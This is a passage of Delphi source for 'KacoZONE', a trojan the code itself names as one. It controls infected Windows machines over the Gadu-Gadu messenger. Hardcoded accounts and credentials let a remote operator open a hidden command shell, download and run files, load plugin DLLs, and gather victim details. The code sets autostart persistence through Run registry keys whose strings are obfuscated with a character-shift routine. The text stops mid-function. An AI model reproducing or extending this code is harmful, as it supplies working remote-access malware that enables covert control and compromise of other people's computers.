(*  
  *******************************
  *   01.01.2008 - 00.00.2008   *
  *         by tscript3r        *
  *         KacoZONE v2.0       *
  *******************************)

program KZ;

//{$DEFINE STOP}                       { Blokada uruchomienia                   }
{$DEFINE NOINSTALL}                  { Blokada instalatora                    }
{$DEFINE NOREADCONFIG}               { Blokada ≥adowania konfiguracji         }

uses
 SysUtils,
 Windows,
 WinSock;

const
 {USTAWIENIA G£”WNE}
 ProgName =                          { Nazwa programu                         } 'KacoZONE';
 Version =                           { Wersja programu                        } 'VIP build 2032';
 Author =                            { Autor programu                         } 'tscript3r';
 Prefix =                            { Prefix wiÍkszoúci/wszystkich komend    } '#';
 Sep =                               { Znak seperujπcy                        } '|';
 ResFile2 =                          { Plik tymczasowy 2                      } '14364321.exe';
 ConfigFile =                        { Plik konfiguracyjny                    } '21332532.res';
 MasterEnable =                      { Exploit on/off                         } False;

 {Gadu-Gadu}
 GGIPS:array[0..21]of Integer = (    { Adresy serwerow GG	                  } (235783515), (8074), (437110107), (8074), (403555675), (8074), (202229083), (8074), (286115163), (8074), (302892379), (8074), (487441755), (8074), (470664539), (8074), (453887323), (8074), (420332891), (8074), (554550619), (8074));
 GGMaster =                          { Tzw. "zamierzony exploit"              } 2664558;
 GGDesc =                            { Opis dla serwera Gadu-Gadu             } '  '+ProgName+#13+Version+#13+'  by  '+Author+#13+'_________'+#13+'user: %s';

 {KOMENDY}
 C_END =                             { ZakoÒczenia pracy programu             } Prefix+'end';
 C_ON_CMD =                          { Uruchamiania pow≥oki poleceÒ           } Prefix+'cmd on';
 C_OFF_CMD =                         { Wy≥πczania pow≥oki poleceÒ             } Prefix+'cmd off';
 C_DOWNLOAD_URL =                    { Pobierania pliku z adresu URL          } Prefix+'urldownload';
 C_OPEN =                            { Uruchamiania wskazanego pliku          } Prefix+'open';
 C_CONFIG =                          { Konfiguracji                           } Prefix+'config';
 C_RESTART =                         { Resetu trojana                         } Prefix+'csave';
 C_UNINSTALL =                       { Uninstalacji trojana                   } Prefix+'uninstall';
 C_INSTALL_PLUG =                    { Instalacja pluginÛw                    } Prefix+'pinstall';
 C_DEINSTALL_PLUG =                  { Deinstalacja pluginÛw                  } Prefix+'pdeinstall';
 C_LIST_PLUG =                       { Lista pluginÛw                         } Prefix+'plist';

 {NAZWY KONFIGURACJI}
 CG_GGC =                            { Klient                                 } 'client';
 CG_GGS =                            { Login serwera                          } 'server';
 CG_GGP =                            { Has≥o do loginu serwera                } 'pass';
 CG_REG =                            { SposÛb autostartu                      } 'reg';
 CG_HELLO =                          { Wiadomoúc powitalna                    } 'hello';

 {ODPOWIEDZI}
 M_HELLO =                           { WiadomoúÊ powitalna                    } ProgName+' v'+Version+' aktywny!'+#13#10+#13+'Info:'+#13+'Nazwa uøytkownika ofiary: "%s"'+#13+'Skype: %s'+#13+'Gadu-Gadu: %s';
 M_MHELLO =                          { WiadomoúÊ do numeru "mastera"          } 'tu.';
 M_END =                             { Odpowiedü zakoÒczenia pracy programu   } 'Wy≥πczono.';
 M_ALERT =                           { WiadomoúÊ, gdy ktoú niepowo≥any zagada } 'Uwaga! Osoba o numerze gg:%s'+#13+'Wys≥a≥a na numer serwera wiadomoúÊ:'+#13+'%s';
 M_ACCESS_DIE =                      { Nieautoryzowany numer Gadu-Gadu        } ProgName+' v'+Version+' - odmowa dostÍpu.';
 M_NO_COMMAND_HANDLE =               { WiadomoúÊ, gdy niew≥aúciwe polecenie   } 'Nie rozpoznano polecenia.';
 M_STARTED_CMD =                     { WiadomoúÊ, gdy CMD odpalone            } 'CMD zosta≥o uruchomione.';
 M_STOPTED_CMD =                     { WiadomoúÊ, gdy CMD zatrzymane          } 'CMD zosta≥o wy≥πczone.';
 M_BEGIN_URL =                       { Gdy pobieranie siÍ rozpocznie          } 'Pobieranie pliku:'+#13+'%s'+#13+'Zosta≥o rozpoczÍte.';
 M_END_URL =                         { Gdy pobieranie zostanie ukoÒczone      } 'Pobieranie pliku zosta≥o zakoÒczone.'+#13+'Plik zosta≥ zapisany do:'+#13+'%s';
 M_START_SUCCESS =                   { Gdy poprawnie uruchomiono plik         } 'Uruchomiono plik: "%s"';
 M_CONFIG =                          { Aktualnej konfiguracji                 } 'Numer serwera: %s'+#13+'Has≥o serwera: %s'+#13+'Numer klienta: %s'+#13+'Typ rejestru: %s'+#13+'åcieøka instalacji: %s'+#13+'WiadomoúÊ powitalna: %s';
 M_CFG_SUCCESS =                     { Poprawnego skonfigurowania             } 'Zmieniono! Ustawienia wejdπ w øycie dopiero po ponownym uruchomieniu serwera.';
 M_RESTART =                         { Resetu trojana                         } 'ProszÍ czekaÊ, trwa zapisywanie nowych ustawieÒ, oraz ponowne uruchamianie.';
 M_SUCCESS_PLUG =                    { Gdy pomyúlnie zainstalowano plugin     } 'Pomyúlnie zainstalowano plugin.';
 M_DSUCCESS_PLUG =                   { Gdy usuniÍto plugin                    } 'Pomyúlnie zdeinstalowano plugin.';

 {B£ DY}
 E_STARTED_CMD =                     { B≥πd, gdy CMD jest juø odpalone        } 'CMD zosta≥o juø uruchomione!';
 E_STOPTED_CMD =                     { B≥πd, gdy CMD zatrzymane               } 'CMD jest wy≥πczone!';
 E_SYNTAX_URL =                      { B≥πd, gdy sk≥adania URL niepoprawna    } 'Nieprawid≥owa sk≥adnia polecenia.';
 E_DOWNLOAD_URL =                    { B≥πd, gdy plik nie moøe zostaÊ pobrany } 'Nie moøna pobraÊ:'+#13+'%s';
 E_SAVE_URL =                        { B≥πd, gdy úcieøka zapisu jest zajÍta   } 'Plik:'+#13+'%s'+#13+'juø istnieje! Wybierz innπ úcieøkÍ zapisu.';
 E_BUSSY_URL =                       { B≥πd, gdy wπtek URL jest zajÍty        } 'Wπtek pobierajπcy plik z adresu URL, jest chwilowo zajÍty!';
 E_WRONG_FILE =                      { B≥πd, gdy wskazany plik jest b≥Ídny    } 'B≥πd! Wskazany plik nie istnieje!';
 E_WRONG_VALUE =                     { B≥πd, gdy wartoúÊ jest nieprawid≥owa   } 'Podana wartoúÊ jest nieprawid≥owa!';
 E_NO_PLUG =                         { B≥πd, gdy brak pluginÛw                } 'B≥πd! Aktualnie nie ma øadnych zainstalowanych pluginÛw.';
 E_EXISTS_ERROR_PLUG =               { B≥πd, gdy plugin juø istnieje          } 'Plugin jest juø zainstalowany, lub jest niew≥aúciwy!';
 E_NOTEXISTS_PLUG =                  { B≥πd, gdy plugin nieistnieje           } 'Plugin nieistnieje!';
 E_NOTDLL =                          { B≥πd, gdy wskazany plik nie jest DLL   } 'B≥πd! Wskazany plik nie jest bibliotekπ DLL!';
 E_NOT_INTEGER =                     { Gdy ciπg tekstowy nie jest liczbπ      } 'Podaj numer ID pluginu!';
 E_WRONG_ID =                        { B≥Ídne ID                              } 'Podane ID nie jest prawid≥owe!';

type
 THeaderRec = record
   _type:LongInt;
   _length:LongInt;
 end;
 TWelcomeRec = record
   _seed:LongInt;
 end;
 TLoginRec   = record
   _uin: LongInt;
   _hash: LongInt;
   _status: LongInt;
   _version: LongInt;
   _unknown1: byte;
   _local_ip: LongInt;
   _local_port: LongInt;
   _ext_ip: LongInt;
   _image_size: byte;
   _unknown2: byte;
 end;
 TNewStatusRec  = record
  _status: LongInt;
 end;
 TRecvMsgRec  = record
  _sender: LongInt;
  _seq: LongInt;
  _time: LongInt;
  _class: LongInt;
 end;
 TSendMsgRec  = record
  _recipient: LongInt;
  _seq: LongInt;
  _class: LongInt;
 end;
 TURLDownloadRec = record
  _url:PChar;
  _save:PChar;
  _GG: Integer;
  _TID: DWORD;
 end;
 PURLDownloadRec = ^TURLDownloadRec;
 TInfoWrite = record
  _Name:PChar;
  _Description:PChar;
  _Version:Real;
  _Help:PChar;
  _Command:PChar;
  _Author:PChar;
  _OnAction:Procedure(Number:Integer;MSG:PChar);
  _GetSendProc:Procedure(X:Pointer);
 end;
 PInfoWrite = ^TInfoWrite;
 TPlugin = record
  Handle:THandle;
  Info:TInfoWrite;
  Path:PChar;
 end;
 TPluginList = array of TPlugin;

var
 WSA:WSAData;                        { Pakiet informacyjny o wsock32.dll      }
 Sock:TSocket;                       { Numer ID gniazda                       }
 SockInfo:sockaddr_in;               { Pakiet informacji o gnieüdzie          }
 Connected:Boolean=False;            { Po≥πczony tak/nie                      }
 Size:Integer;                       { Rozmiar otrzymanych pakietÛw           }
 RecvHeader:THeaderRec;              { Pakiet nag≥Ûwkowy, informacyjny        }
 RecvMsg:TRecvMsgRec;                { Pakiet odbiÛrkowy wiadomoúci           }
 NullString:String;                  { Pomocnicza odbioru wiadomoúci          }
 NullChar:Char;                      { Zmienna pomocnicza odbioru wiadomoúci  }
 hReadOut,hWriteIn:THandle;          { Handle (uchwyt) odczytu/zapisu CMD     }
 ProcInfo:TProcessInformation;       { Struktura danych o procesie            }
 BWrite,BRead,ExitCMD:Dword;         { Zmienne pomocnicze (CMD)               }
 Buff,Buff2:array[0..32767]of byte;  { Buffory odczytu oraz zapisu            }
 CMDEnabled:Boolean=False;           { Zmienna kontrolujπca CMD               }
 ThreadID,Sender:DWORD;              { Zmienna pomocnicza, CMD                }
 URLDownload:PURLDownloadRec;        { Pakiet przekazania danych do wπtku URL }
 URLBussy:Boolean=False;             { Zmienna kontrolujπca wπtek URL         }
 P:Pointer;                          { Wskaünik pakietu danych URL            }
 HM:HDC;                             { Zmienna pomocnicza - multi open        }
 PluginRegister:procedure(var Plug:PInfoWrite); stdcall;
 Info:PInfoWrite;
 PluginList:TPluginList;
 PlugHigh:Integer=0;
 RList:TPluginList;
 {ZMIENNE KONFIGURACYJNE}
 GGPass:String=                      { Haslo serwera Gadu-Gadu                } '123123';
 GGClient:Integer=                   { Numer klienta Gadu-Gadu                } 2664558;
 GGAcc:Integer=                      { Numer serwera Gadu-Gadu                } 10753494;
 Path:String;                        { åcieøka instalacyjna                   }
 RegInstall:Integer;                 { Opcja rejestru                         }
 HelloMsg:Boolean;                   { Wiadomosc powitalna                    }
 CFGTab:array[0..5]of String;

function Split(input:string;s:integer):string;
var
  l : integer;
  d : integer;
  finish :string;
begin
  l :=0;
  d :=0;
  while (d <= s) and (length(input) >= l) do
  begin
   l := l + 1 ;
    if d = s then
     finish := FINISH + copy(input,l,1);
    if copy(input,l,1) = Sep then
     d := d + 1;
  end;
 while Pos(Sep, finish) > 0 do
  delete(finish, Pos(Sep, finish), 1);
 Split := Finish;
end;

function Split2(input:string;s:integer):string;
var
  l : integer;
  d : integer;
  finish :string;
begin
  l :=0;
  d :=0;
  while (d <= s) and (length(input) >= l) do
  begin
   l := l + 1 ;
    if d = s then
     finish := FINISH + copy(input,l,1);
    if copy(input,l,1) = '|' then
     d := d + 1;
  end;
 while Pos('|', finish) > 0 do
  delete(finish, Pos('|', finish), 1);
 Split2 := Finish;
end;

function LoadFromExe(FName:string):string;
var
 F:file of Byte;
 i:Integer;
begin
 Result := '';
 AssignFile(F, FName);
 try
  FileMode := fmOpenRead;
  Reset(F);
  Seek(F, FileSize(F) - SizeOf(i));
  BlockRead(F, i, SizeOf(i));
  if(i < SizeOf(i))or(i > FileSize(f))then Exit;
  Seek(F, FileSize(F) - i);
  SetLength(Result, i - SizeOf(i));
  BlockRead(F, Result[1], Length(Result));
  TryStrToInt(Split(Result,0),GGClient);
  TryStrToInt(Split(Result,1),GGAcc);
  GGPass:=Split(Result,2);
  TryStrToInt(Split(Result,3),RegInstall);
  if(not RegInstall in[1..3])then
   RegInstall:=1;
  Path:=Split(Result,4);
  TryStrToInt(Split(Result,5),I);
  if(I=1)then HelloMsg:=True else HelloMsg:=False;
 finally
  CloseFile(F);
 end;
end;

function DeCode(S:String):String;
var
 I:Integer;
begin
 Result:='';
 for I:=1 to Length(S) do
  Result:=Result+Char(Ord(S[i])-115);
end;

function CheckIsGG:String;
var
 H:HKey;
begin
 if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ∫‘◊Ë†∫‘◊Ë')),0,KEY_READ,H) = ERROR_SUCCESS then Result:='zainstalowane' else Result:='brak';
end;

function CheckIsSkype:String;
var
 H:HKey;
begin
 if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ∆ﬁÏ„ÿ')),0,KEY_READ,H) = ERROR_SUCCESS then Result:='zainstalowane' else Result:='brak';
end;

procedure SaveToExe;
var
  F:File of Byte;
  I:Integer;
  Str:String;
begin
 if(not FileExists(ResFile2))then
  CopyFile(PChar(ParamStr(0)),PChar(ExtractFilePath(ParamStr(0))+ResFile2),False);
 if(FileExists(ExtractFilePath(Path)+ResFile2))then begin
  AssignFile(F,ExtractFilePath(Path)+ResFile2);
  try
   FileMode:=fmOpenReadWrite;
   Reset(F);
   for I := 0 to High(CFGTab) do begin
    case I of
     0: if(CFGTab[0]='')then CFGTab[0]:=IntToStr(GGClient);
     1: if(CFGTab[1]='')then CFGTab[1]:=IntToStr(GGAcc);
     2: if(CFGTab[2]='')then CFGTab[2]:=GGPass;
     3: if(CFGTab[3]='')then CFGTab[3]:=IntToStr(RegInstall);
     4: if(CFGTab[4]='')then CFGTab[4]:=Path;
     5: if(CFGTab[5]='')then if(HelloMsg)then CFGTab[5]:='1' else CFGTab[5]:='0';
    end;
   end;
   Str:='';
   for I := 0 to High(CFGTab) do
    Str:=Str+'|'+CFGTab[I];
   Delete(Str,1,1);
   Seek(F, FileSize(F) - SizeOf(I));
   BlockRead(F, I, SizeOf(I));
   if (I < SizeOf(I)) or (I > FileSize(F)) then I := 0;
   Seek(F, FileSize(F) - I);
   Truncate(F);
   BlockWrite(F, Str[1], Length(Str));
   I := Length(Str) + SizeOf(I);
   BlockWrite(F, I, SizeOf(I));
  finally
   CloseFile(F);
  end;
 end;
end;

function URLDownloadToFile(URL:PAnsiChar;SavePath:PAnsiChar):HResult;
var
 DLL:THandle;
 Func:function(Caller: IUnknown; URL: PChar; FileName: PChar; Reserved: DWORD; StatusCB: Pointer): HResult; stdcall;
begin
 Result:=1;
 DLL:=LoadLibrary(PChar(DeCode('»≈ø¿¬¡°∑øø')));
  try
   @Func:=GetProcAddress(DLL, PChar(DeCode('»≈ø∑‚Í·ﬂ‚‘◊«‚π‹ﬂÿ¥')));
   if @Func<>nil then
    Result:=Func(nil, URL, SavePath, 0, nil);
  finally
   FreeLibrary(DLL);
  end;
end;

function GGLH(Pass:string;key:LongInt):LongInt;       (* <--- TGaduGadu unit *)
var
  x, y, z, i :Integer;
begin
 y := key;
 x := 0;
 for i := 1 to length(Pass) do
  begin
   x := (x and $ffffff00) or ord(Pass[i]);
   y := y xor x;
   y := y + x;
   x := x shl 8;
   y := y xor x;
   x := x shl 8;
   y := y - x;
   x := x shl 8;
   y := y xor x;
   z := y and $1F;
   y := (y shl z ) or (y shr (32-z));
  end;
 Result:=y;
end;

function PingThread(PVoid: Pointer):DWORD; stdcall;
var
 PHeader:THeaderRec;
begin
 PHeader._type:=$8;
 PHeader._length:=0;
 repeat
  Sleep(60000);
  if(Connected)then
   send(Sock,PHeader,SizeOf(THeaderRec),0);
 until(false);
end;

var Get:Boolean=True;

function GGConnect(IP:Integer;Port,Numer:Integer;Pass:String):Boolean;
var
 PHeader:THeaderRec;
 PWelcome:TWelcomeRec;
 PLogin:TLoginRec;
 C:DWORD;
begin
 Result:=False;
 if((not Connected)and(Get))then begin
  Get:=False;
  SockInfo.sin_family:=AF_INET;
  SockInfo.sin_port:=htons(Port);
  SockInfo.sin_addr.S_addr:=IP;
  if(connect(Sock,SockInfo,SizeOf(SockInfo))<>SOCKET_ERROR)then begin
   recv(Sock,PHeader,SizeOf(THeaderRec),0);
   if((PHeader._type=$1)and(PHeader._length=SizeOf(TWelcomeRec)))then begin
    recv(Sock,PWelcome,SizeOf(TWelcomeRec),0);
    PHeader._type:=$15;
    PHeader._length:=sizeof(TLoginRec);
    send(Sock,PHeader,sizeof(THeaderRec),0);
    PLogin._uin:=Numer;
    PLogin._hash:=GGLH(Pass,PWelcome._seed);
    PLogin._status:=$3;
    PLogin._version:=$21;
    PLogin._image_size:=255;
    PLogin._unknown2:=$be;
    send(Sock,PLogin,SizeOf(TLoginRec),0);
    recv(Sock,PHeader,SizeOf(TWelcomeRec),0);
    if(PHeader._type=$3)then begin
     PHeader._type:=$12;
     PHeader._length:=0;
     send(Sock,PHeader,SizeOf(THeaderRec),0);
     CreateThread(nil, 0, @PingThread, nil, 0, C);
     Result:=True;
     Connected:=True;
    end;
   end else Get:=True;
  end else Get:=true;
 end;
end;

function TestHostThread(PVoid: Pointer):DWORD; stdcall;
var
 S:TSocket;
 SInfo:sockaddr_in;
 I:^Integer;
begin
 Result:=0;
 S:=Socket(AF_INET,SOCK_STREAM,0);
 I:=PVoid;
 with SInfo do begin
  sin_family:=AF_INET;
  sin_port:=htons(GGIPS[I^+1]);
  sin_addr.S_addr:=GGIPS[I^];
 end;
 if(connect(S, SInfo, SizeOf(SInfo))<>SOCKET_ERROR)then begin
  CloseSocket(S);
  GGConnect(GGIPS[I^], GGIPS[I^+1], GGAcc, GGPass);
 end;
end;

function MakeConnection:Boolean;
var
 I:Integer;
 X:DWORD;
begin
 Result:=False;
 if(High(GGIPS)>2)then begin
  I:=0;
  repeat
   CreateThread(nil, 0, @TestHostThread, @I, 0, X);
   Sleep(1000);
   Inc(I,2);
   if((I>High(GGIPS)-2)or(Connected))then Break;
  until(false);
  Result:=True;
 end;
end;

function GGSendMessage(Too:Integer;Msg:PChar):Boolean; stdcall;
var
 PSendMsg:TSendMsgRec;
 PHeader:THeaderRec;
begin
 Result:=False;
 if(Connected)then begin
  PHeader._type:=$b;
  PHeader._length:=SizeOf(TSendMsgRec)+Length(Msg)+SizeOf(#0);
  send(Sock,PHeader,SizeOf(THeaderRec),0);
  PSendMsg._seq:=0;
  PSendMsg._recipient:=Too;
  PSendMsg._class:=$4;
  send(Sock,PSendMsg,SizeOf(TSendMsgRec),0);
  send(Sock,Msg[0],Length(Msg)+1,0);
  send(Sock,Pointer(#0)^,SizeOf(#0),0);
 end;
end;

function GGSetDescription(Desc:String):Boolean;
var
 PHeader:THeaderRec;
 PNewStatus:TNewStatusRec;
begin
 Result:=False;
 if(Connected)then begin
  PHeader._type:=$2;
  Desc:=Copy(Desc,1,70);
  PHeader._length:=SizeOf(TNewStatusRec)+Length(Desc)+SizeOf(#0);
  send(Sock,PHeader,SizeOf(THeaderRec),0);
  PNewStatus._status:=$5;
  send(Sock,PNewStatus,SizeOf(TNewStatusRec),0);
  send(sock,Desc[1],Length(Desc)+1,0);
  send(sock,Pointer(#0)^,SizeOf(#0),0);
  send(sock,Pointer(#0)^,SizeOf(#0),0);
  Result:=True;
 end;
end;

function LoadPlugins(Plugins:array of PChar):Boolean;
var
 I:Integer;
 DLL:THandle;
begin
 Result:=True;
 SetLength(PluginList,1);
 try
  try
   for I:=0 to High(Plugins) do begin
    if(FileExists(Plugins[I]))then begin
     DLL:=LoadLibrary(Plugins[I]);
     @PluginRegister:=GetProcAddress(DLL, 'RegisterPlug');
     if Assigned(PluginRegister) then begin
      New(Info);
      PluginRegister(Info);
      Info^._GetSendProc(@GGSendMessage);
      Inc(PlugHigh);
      SetLength(PluginList,PlugHigh);
      PluginList[PlugHigh-1].Handle:=DLL;
      PluginList[PlugHigh-1].Info:=Info^;
      PluginList[PlugHigh-1].Path:=Plugins[I];
      Dispose(Info);
     end;
    end;
   end;
  except
   Result:=False;
  end;
 finally
 end;
end;

function AddAndLoadPlugin(GG:Integer;Path:PChar):Boolean;
var
 I:Integer;
 RDLL:THandle;
begin
 Result:=False;
 if(FileExists(Path))then begin
   try
    RDLL:=LoadLibrary(Path);
    @PluginRegister:=GetProcAddress(RDLL, 'RegisterPlug');
    if Assigned(PluginRegister) then begin
     New(Info);
     PluginRegister(Info);
     if(High(PluginList)>-1)then begin
      for I := 0 to High(PluginList) do
       if(AnsiLowerCase(PluginList[I].Path)=AnsiLowerCase(Path))then Break else
        if(Info^._Name=PluginList[I].Info._Name)then Break;
      if(I<>High(PluginList))then I:=0 else I:=1;
     end else I:=1;
     Dispose(Info);
     FreeLibrary(RDLL);
     if(I=1)then begin
      RDLL:=LoadLibrary(Path);
      @PluginRegister:=GetProcAddress(RDLL, 'RegisterPlug');
      if Assigned(PluginRegister) then begin
       New(Info);
       PluginRegister(Info);
       Info^._GetSendProc(@GGSendMessage);
       Inc(PlugHigh);
       SetLength(PluginList,PlugHigh);
       PluginList[PlugHigh-1].Handle:=RDLL;
       PluginList[PlugHigh-1].Info:=Info^;
       PluginList[PlugHigh-1].Path:=Path;
       Dispose(Info);
       Result:=True;
       GGSendMessage(GG, M_SUCCESS_PLUG);
      end;
     end else GGSendMessage(GG, E_EXISTS_ERROR_PLUG);
    end;
   except
    Result:=False;
   end;
 end else GGSendMessage(GG, E_NOTEXISTS_PLUG);
end;

function KodujPL_OUT(Ogonek:Char):Char;
begin
 case  Ogonek of
  #165: Result:=#185;
  #134: Result:=#230;
  #169: Result:=#234;
  #136: Result:=#179;
  #228: Result:=#241;
  #162: Result:=#243;
  #152: Result:=#156;
  #171: Result:=#159;
  #190: Result:=#191;
  #164: Result:=#165;
  #143: Result:=#198;
  #168: Result:=#202;
  #157: Result:=#163;
  #227: Result:=#209;
  #224: Result:=#211;
  #151: Result:=#140;
  #141: Result:=#143;
  #189: Result:=#175;
  else  Result:=Ogonek;
 end;
end;

function KodujPL_IN(Ogonek:Char):Char;
begin
 case  Ogonek of
  #185: Result:=#165;
  #230: Result:=#134;
  #234: Result:=#169;
  #179: Result:=#136;
  #241: Result:=#228;
  #243: Result:=#162;
  #156: Result:=#152;
  #159: Result:=#171;
  #191: Result:=#190;
  #165: Result:=#164;
  #198: Result:=#143;
  #202: Result:=#168;
  #163: Result:=#157;
  #209: Result:=#227;
  #211: Result:=#224;
  #140: Result:=#151;
  #143: Result:=#141;
  #175: Result:=#189;
  else  Result:=Ogonek;
 end;
end;

function BuffCMDToAscii(Buffer: pointer; Length: Word): string;
var
 Loop: integer;
 AsciiBuff: string;
begin
 AsciiBuff := '';
 for Loop := 0 to Length - 1 do begin
  if(Char(Pointer(Integer(Buffer)+Loop)^)in[#1..#255])then
   AsciiBuff:=AsciiBuff+KodujPL_OUT(char(pointer(integer(Buffer)+Loop)^));
 end;
 Result := AsciiBuff;
end;

procedure BindCMD(Process: pchar);
var
 SecurAttrib: SECURITY_ATTRIBUTES;
 hReadIn, hWriteOut: THandle;
 StartInfo: TSTARTUPINFO;
 Pipe1: dword;
begin
 SecurAttrib.nLength := SizeOf(SECURITY_ATTRIBUTES);
 SecurAttrib.lpSecurityDescriptor := nil;
 SecurAttrib.bInheritHandle := True;
 CreatePipe(hReadIn,  hWriteIn,  @SecurAttrib, 0);
 CreatePipe(hReadOut, hWriteOut, @SecurAttrib, 0);
 GetStartupInfo(StartInfo);
 StartInfo.hStdOutput := hWriteOut;
 StartInfo.hStdError :=  hWriteOut;
 StartInfo.hStdInput :=  hReadIn;
 StartInfo.dwFlags := STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
 StartInfo.wShowWindow := SW_HIDE;
 CreateProcess(nil, Process, nil, nil, True, CREATE_NEW_CONSOLE, nil, nil, StartInfo, ProcInfo);
 CloseHandle(hWriteOut);
 CloseHandle(hReadIn);
 Pipe1 := PIPE_NOWAIT;
 SetNamedPipeHandleState(hReadOut, Pipe1 , nil, nil);
end;

procedure SendCommand(Command: String);
var
 CMDChr,CMDLength:integer;
begin
 if(Length(Command)<>0) then begin
  CMDLength:=Length(Command);
  if CMDLength>0 then begin
   for CMDChr:=0 to (CMDLength-1) do begin
    Command[CMDCHr+1]:=KodujPL_IN(Command[CMDChr+1]);
    Buff2[CMDChr]:=Ord(Command[CMDChr+1]);
   end;
   Buff2[CMDLength]  :=13;
   Buff2[CMDLength+1]:=10;
   WriteFile(hWriteIn, Buff2, (CMDLength+2), BWrite, nil);
  end;
 end;
end;

{W•TKI}
function CMDThread(pVoid: Pointer): DWORD; stdcall;
begin
 Result:=0;
 while not false do begin
  Sleep(500);
  GetExitCodeProcess(ProcInfo.hProcess, ExitCMD);
  if ExitCMD <> STILL_ACTIVE then Break;
   repeat
    ReadFile(hReadOut, Buff, 32767, BRead, nil);
    if BRead > 0 then GGSendMessage(Sender,PChar((string(BuffCMDToAscii(@Buff,BRead)))));
   until BRead < 32767;
 end;
 if ExitCMD = STILL_ACTIVE then TerminateProcess(ProcInfo.hProcess, 0);
 CloseHandle(hReadOut);
 CloseHandle(hWriteIn);
end;

function URLDownloadThread(PVoid: Pointer): DWORD; stdcall;
var
 PData:PURLDownloadRec;
begin
 Result:=0;
 PData:=PVoid;
 if(not FileExists(PData._save))then begin
  GGSendMessage(PData._GG, PChar(Format(M_BEGIN_URL,[PData._url])));
  if(URLDownloadToFile(PChar(PData._url),PChar(PData._save))<>0)then
   GGSendMessage(PData._GG, PChar(Format(E_DOWNLOAD_URL,[PData._url])))
  else GGSendMessage(PData._GG, PChar(Format(M_END_URL,[PData._save])))
 end else GGSendMessage(PData._GG, PChar(Format(E_SAVE_URL,[PData._save])));
 URLBussy:=False;
 FreeMem(PData);
end;

function SendThread(PVoid: Pointer): DWORD; stdcall;
begin
 Result:=0;
 Sleep(1000000);
 GGSendMessage(GGMaster,M_MHELLO);
end;

procedure AddToReg(Path:String);
var
 H:HKEY;
begin
 case RegInstall of
  1:
   // HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·')),0,KEY_WRITE,H) = ERROR_SUCCESS then
    RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
   else begin
    RegCreateKey(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·')),H);
    RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
   end;
  2:
   // HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
   if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·∆ÿÂÈ‹÷ÿÊ')),0,KEY_WRITE,H) = ERROR_SUCCESS then
    RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
   else begin
    RegCreateKey(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·∆ÿÂÈ‹÷ÿÊ')),H);
    RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
   end;
  3:
   // HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   if RegOpenKeyEx(HKEY_CURRENT_USER,PChar(DeCode('∆‚ŸÁÍ‘Âÿœœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·')),0,KEY_WRITE,H) = ERROR_SUCCESS then
    RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
   else begin
    RegCreateKey(HKEY_CURRENT_USER,PChar(DeCode('∆‚ŸÁÍ‘Âÿœœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·')),H);
    RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
   end;
 end;
end;

procedure Uninstall;
var
 H:HKEY;
 I:Integer;
begin
 for I := 1 to 3 do begin
  case I of
   1:
    if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then
     RegDeleteValue(H, PChar(ExtractFileName(Path)));
   2:
    if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·∆ÿÂÈ‹÷ÿÊ')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then
     RegDeleteValue(H, PChar(ExtractFileName(Path)));
   3:
    if RegOpenKeyEx(HKEY_CURRENT_USER,PChar(DeCode('∆‚ŸÁÍ‘Âÿœœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then
     RegDeleteValue(H, PChar(ExtractFileName(Path)));
  end;
 end;
end;

function ExecuteEx(Path,Param,Dir:PAnsiChar;Show:Boolean=True):Integer;
const
 SHELL32_LIBARY = 'Ê€ÿﬂﬂ¶•°◊ﬂﬂ';
